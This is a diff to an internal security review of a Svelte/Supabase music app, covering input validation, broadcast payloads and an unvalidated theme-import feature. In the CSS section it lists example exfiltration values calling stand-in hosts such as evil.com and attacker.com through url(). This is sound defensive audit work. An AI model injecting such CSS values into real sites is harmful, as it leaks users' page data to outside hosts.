@@ -17,7 +17,7 @@ This app is mostly a client. Supabase handles auth and remote data. The app keep
 |------|--------|-------|
 | `{@html}` usage | ✅ Controlled | Only 2 locations: `docs/[...slug]/+page.svelte:11`, `tool-tip.svelte:51` |
 | Tooltip content | ⚠️ Trusted | Accepts arbitrary HTML; source is typically i18n but not enforced |
-| `/api/track-meta` validation | ✅ Verified | Rejects empty payloads, caps at 50 IDs (`+server.js:14-15`) |
+| `/api/track-meta` validation | ⚠️ Partial | Rejects empty payloads, caps at 50 IDs — but no YouTube ID format validation or individual encoding |
 | Search sanitization | ✅ Verified | `search-fts.js:29-34` sanitizes for PostgREST filter syntax |
 | Env var separation | ✅ Verified | `.env.example` shows `PUBLIC_*` vs private `YOUTUBE_API_KEY` |
 | Shadow DOM usage | ⚠️ Note | Custom elements use `shadowRoot.innerHTML` (isolated, but worth noting) |
@@ -26,8 +26,9 @@ This app is mostly a client. Supabase handles auth and remote data. The app keep
 | Redirect validation | ⚠️ Review needed | `redirect` query param used in auth flows without explicit validation |
 | Seed imports | ⚠️ Trust boundary | `PUBLIC_SEED_URLS` fetches remote data into local state |
 | External link hardening | ⚠️ Inconsistent | `rel="noopener noreferrer"` used in some places, not all |
-| Broadcast payloads | ⚠️ Review needed | Realtime broadcast data trust model not documented |
+| Broadcast payloads | ⚠️ Defensive checks only | Array/type guards present, but no schema validation |
 | Embed host allowlisting | ⚠️ Verify | `EMBED_HOSTS` env var and server redirect logic needs documentation |
+| CRUD input sanitization | ❌ Not documented | Channel/track values stored as-is; theme import feeds CSS custom properties |
 
 ## Default posture
 
@@ -204,6 +205,52 @@ In standalone mode, `PUBLIC_SEED_URLS` specifies remote `.json`, `.txt`, or `.m3
 
 **Recommendation**: Document this clearly for self-hosters. Consider adding a warning in standalone mode that seed data is not validated.
 
+## CRUD Input & Settings
+
+Channel and track data is largely stored as-is, with minimal sanitization or validation.
+
+### Channel/Track Descriptions
+
+**Implementation:**
+- `src/lib/collections/channels.ts:211` — `createChannel()` stores `input.description || ''` directly
+- `src/lib/collections/tracks.ts:228` — `addTrack()` stores `input.description || ''` directly
+
+**Risk**: User-provided descriptions are stored without sanitization. When rendered via `LinkEntities` component, they rely on Svelte's default text escaping (which is safe). However:
+
+- Descriptions containing hashtags/mentions are parsed by `ENTITY_REGEX` — could be exploited for spam or misleading links
+- No length limits — extremely long descriptions could cause performance issues
+
+**Current mitigation**: Svelte's default escaping in `LinkEntities.svelte` prevents XSS.
+
+### Theme Import & CSS Custom Properties
+
+**Implementation:**
+- `src/lib/components/theme-editor.svelte:137-157` — Parses user-provided theme strings and sets `appState.custom_css_variables`
+- `src/lib/apply-css-variables.js:1` — Applies variables directly to `document.documentElement.style`
+- `src/routes/+layout.svelte:153` — Called in layout effect
+
+**Risk**: User-controlled CSS values are applied to the root element without validation:
+
+```js
+// theme-editor.svelte:152
+variables[cleanKey] = value.trim()
+
+// apply-css-variables.js:45
+root.style.setProperty(name, value)
+```
+
+Potential attacks:
+- CSS injection via `url()` values (e.g., `--accent-light: url(evil.com/steal.css)`)
+- Exfiltration via `background: url(https://attacker.com/?data=...)`
+- UI disruption via `display: none`, `visibility: hidden`, etc.
+
+**Current mitigation**: None beyond "trust the user's own theme input".
+
+**Recommendation**: 
+- Validate CSS value format before applying (e.g., reject `url()`, `expression()`, `import`)
+- Consider a allowlist of valid CSS color formats for theme variables
+- Document that theme import is a trust boundary — only import from trusted sources
+
 ## Server routes and third-party calls
 
 `/api/track-meta` is currently the main server-side trust boundary in this app.
@@ -215,6 +262,9 @@ In standalone mode, `PUBLIC_SEED_URLS` specifies remote `.json`, `.txt`, or `.m3
 const {ids} = await request.json()
 if (!ids || ids.length === 0) error(400, 'No YouTube IDs provided')
 if (ids.length > 50) error(400, 'Cannot process more than 50 YouTube IDs at once')
+
+// ⚠️ No validation of YouTube ID format or individual encoding
+const videoIds = ids.join(',')  // Direct interpolation
 ```
 
 **Verified security properties:**
@@ -225,6 +275,22 @@ if (ids.length > 50) error(400, 'Cannot process more than 50 YouTube IDs at once
 - ✅ Returns only needed fields (title, duration, thumbnails, etc.)
 - ✅ Fails with clear 4xx/5xx errors
 
+**Gaps:**
+
+- ❌ No YouTube ID format validation (e.g., `^[a-zA-Z0-9_-]{11}$`)
+- ❌ No individual URL encoding — `ids.join(',')` is interpolated directly
+- ❌ No type check that `ids` is actually an array of strings
+
+**Risk**: Malformed IDs could cause upstream YouTube API errors or unexpected behavior. Not critical (YouTube API will reject invalid IDs), but worth hardening.
+
+**TODO**: Add validation loop before joining:
+```js
+const RE_YT_ID = /^[a-zA-Z0-9_-]{11}$/
+if (!Array.isArray(ids) || !ids.every(id => RE_YT_ID.test(id))) {
+  error(400, 'Invalid YouTube ID format')
+}
+```
+
 Rules:
 
 - Validate request shape before using it.
@@ -232,6 +298,7 @@ Rules:
 - Fail with clear 4xx errors for bad input.
 - Keep upstream secrets on the server.
 - Return only the fields the client needs.
+- **Validate input format** — Don't assume array contents match expected schema.
 
 When adding more endpoints, keep them this small unless there is a clear reason not to.
 
@@ -341,11 +408,18 @@ The app uses Supabase Realtime channels to broadcast player state between broadc
 - Misleading state (e.g., fake track info) — more of a UX issue than security
 
 **Current mitigation**: 
-- Payloads are handled by `broadcast.js` which validates structure before applying
+- **Defensive checks in `applyBroadcastState`** — `Array.isArray(decks)` guard at line 548
+- **Per-field type guards** — e.g., `track_id` presence check at line 304
 - State is rendered via Svelte's escaped bindings (not `{@html}`)
 - Supabase RLS policies control who can write to the `broadcast` table
 
-**Recommendation**: Document that broadcast data is "trusted but verified" — validate payload structure before applying state changes.
+**Gaps**:
+
+- ❌ No schema validation library (e.g., Zod) — relies on manual type guards
+- ❌ No rate limiting on broadcast updates
+- ❌ No payload size limits
+
+**Recommendation**: Document that broadcast data is "trusted but verified" — validate payload structure before applying state changes. Consider adding Zod schema for broadcast payloads.
 
 ## PWA / Service Worker
 
@@ -384,13 +458,15 @@ If you touch any of those areas, tighten the boundary instead of copying the pat
 
 - [ ] **Validate `redirect` query param** — Ensure it's a same-origin path (starts with `/`, no `://`)
 - [ ] **Add CSP headers** — Configure in Cloudflare Workers or hosting. Start with `default-src 'self'`, add domains as needed
+- [ ] **Validate YouTube ID format in `/api/track-meta`** — Add regex check `^[a-zA-Z0-9_-]{11}$` before joining IDs
 
 ### Medium priority
 
 - [ ] **Standardize external link hardening** — Add `rel="noopener noreferrer"` consistently (lint rule or helper component)
 - [ ] **Document seed import warnings** — Add notice for self-hosters that `PUBLIC_SEED_URLS` data is not validated
-- [ ] **Add broadcast payload validation** — Document and enforce payload schema validation in `broadcast.js`
+- [ ] **Add broadcast payload validation** — Consider Zod schema for broadcast state payloads
 - [ ] **CSP `frame-ancestors` directive** — Enforce `EMBED_HOSTS` at browser level, not just server redirect
+- [ ] **Validate CSS custom properties** — Reject `url()`, `expression()`, `import` in theme import
 
 ### Low priority
 
@@ -398,3 +474,4 @@ If you touch any of those areas, tighten the boundary instead of copying the pat
 - [ ] **Add `bun audit` or dependency scanning to CI** — Catch known CVEs early
 - [ ] **Document `LinkEntities` escaping behavior** — Add explicit test showing `<script>` tags are escaped
 - [ ] **User-controlled "Clear local data"** — Add button in settings to clear localStorage/IDB before logout
+- [ ] **Add description length limits** — Prevent performance issues from extremely long descriptions
